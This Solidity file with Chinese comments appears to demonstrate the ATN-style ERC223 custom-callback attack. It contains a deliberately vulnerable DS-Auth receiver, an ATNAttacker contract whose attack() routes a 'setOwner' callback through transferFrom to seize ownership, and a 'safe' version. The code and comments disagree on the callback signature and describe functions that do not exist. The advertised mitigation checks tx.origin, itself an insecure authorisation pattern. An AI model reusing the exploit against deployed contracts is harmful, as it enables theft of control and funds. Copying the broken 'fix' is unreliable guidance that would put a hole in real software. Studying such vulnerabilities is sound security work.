// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.26;

import {VulnERC223Token, DSAuth, IERC223Receiver} from "./VulnERC223Token.sol";

/**
 * @title VulnerableReceiver
 * @notice 有漏洞的接收合约，继承了DS-Auth
 * @dev VULNERABILITY: 在tokenFallback中，如果代币合约被设置为authority，
 *      攻击者可以通过发送代币来触发tokenFallback，然后在tokenFallback中调用setOwner
 */
contract VulnerableReceiver is VulnERC223Token, DSAuth, IERC223Receiver{
    
    event TokensReceived(address indexed from, uint256 amount);
    
    constructor() DSAuth() VulnERC223Token("Vulnerable Receiver", "VULN", 18, 0) {
        // VULNERABILITY: isAuthorized允许代币合约通过检查
        // 这使得transferFrom可以通过自定义回调来调用setOwner
    }
    
    /**
     * @notice ERC223的tokenFallback函数
     * @dev 标准tokenFallback实现，不再用于攻击
     */
    function tokenFallback(address from, uint256 value, bytes calldata /*data*/) external {
        emit TokensReceived(from, value);
    }
    
    function mint(address to, uint256 amount) external auth {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/**
 * @title ATNAttacker
 * @notice 攻击合约，利用transferFrom的自定义回调漏洞
 * @dev 攻击流程：
 *      1. 攻击者部署此合约
 *      2. 攻击合约调用代币的transferFrom，指定"setOwner(address)"作为自定义回调
 *      3. 代币合约使用call调用目标合约的setOwner函数
 *      4. 在setOwner中，msg.sender是代币合约
 *      5. isAuthorized检查：src == address(token) -> true（因为允许代币合约）
 *      6. 权限检查通过，攻击者成为新的owner
 */
contract ATNAttacker is IERC223Receiver {
    VulnerableReceiver public target;
    address public attacker;
    bool public attackExecuted;
    
    event AttackExecuted(string message);

    constructor(address _target) {
        target = VulnerableReceiver(_target);
        attacker = msg.sender;
    }
    
    /**
     * @notice 执行攻击
     * @dev 使用transferFrom的自定义回调功能来调用setOwner
     *      1. 调用transferFrom，指定"setOwner(address,uint256,bytes)"作为回调函数名
     *      2. 在data中编码攻击者地址
     *      3. 代币合约会使用call调用目标合约的setOwner(from, value, data)
     *      4. 目标合约的setOwner会从data中提取地址并调用真正的setOwner
     *      5. 由于isAuthorized允许代币合约，权限检查通过
     */
    function attack() external {
        require(msg.sender == attacker, "Only attacker");
        require(!attackExecuted, "Attack already executed");
        // 构造攻击数据：在data中编码攻击者地址
        // transferFrom会调用setOwner(address,uint256,bytes)，其中data包含攻击者地址
        bytes memory attackData = abi.encode(attacker);
        
        // 使用transferFrom，指定"setOwner(address,uint256,bytes)"作为自定义回调
        // VULNERABILITY: transferFrom会使用call调用目标合约的setOwner函数
        // 函数签名：setOwner(address,uint256,bytes)
        string memory callbackFunction = "setOwner(address)";
        
        // 调用transferFrom，这会触发目标合约的setOwner(from, value, data)
        // 目标合约的setOwner会从data中提取攻击者地址并调用真正的setOwner
        // 在真正的setOwner中，msg.sender是代币合约，isAuthorized会返回true
        target.transferFrom(
            address(this),           // from: 攻击合约
            address(target),         // to: 目标合约
            1,                       // value: 最小金额
            attackData,              // data: 包含攻击者地址（编码后的）
            callbackFunction         // custom_callback: "setOwner(address,uint256,bytes)"
        );
        
        attackExecuted = true;
    }
    
    /**
     * @notice tokenFallback实现（接口要求）
     */
    function tokenFallback(address /*from*/, uint256 /*value*/, bytes calldata /*data*/) external {
        // 接口实现，实际不使用
    }
}

/**
 * @title SafeReceiver
 * @notice 安全版本的接收合约，正确实现权限检查
 */
contract SafeReceiver is DSAuth, IERC223Receiver {
    VulnERC223Token public token;
    
    constructor(address _token) DSAuth() {
        token = VulnERC223Token(_token);
        // MITIGATION: 不将代币合约设置为authority
        // 这样即使通过tokenFallback，也无法调用需要auth权限的函数
    }
    
    /**
     * @notice 安全的tokenFallback实现
     * @dev MITIGATION: 不在tokenFallback中执行任何敏感操作
     */
    function tokenFallback(address /*from*/, uint256 /*value*/, bytes calldata /*data*/) external  {
        require(msg.sender == address(token), "Only token contract can call");
        // MITIGATION: 不执行任何敏感操作
        // 敏感操作应该通过单独的函数，并检查tx.origin
    }
    
    /**
     * @notice 安全的setOwner函数
     * @dev MITIGATION: 重写setOwner，检查tx.origin而不是msg.sender
     */
    function setOwner(address newOwner) public {
        // MITIGATION: 检查tx.origin是owner，而不是msg.sender
        // 这样可以防止通过合约调用来绕过权限检查
        require(tx.origin == owner, "Only owner can set owner");
        address oldOwner = owner;
        owner = newOwner;
        emit SetOwner(oldOwner, newOwner);
    }
    
    /**
     * @notice 提取代币
     */
    function withdraw(uint256 amount) external auth {
        require(token.balanceOf(address(this)) >= amount, "Insufficient balance");
        token.transfer(owner, amount);
    }
}

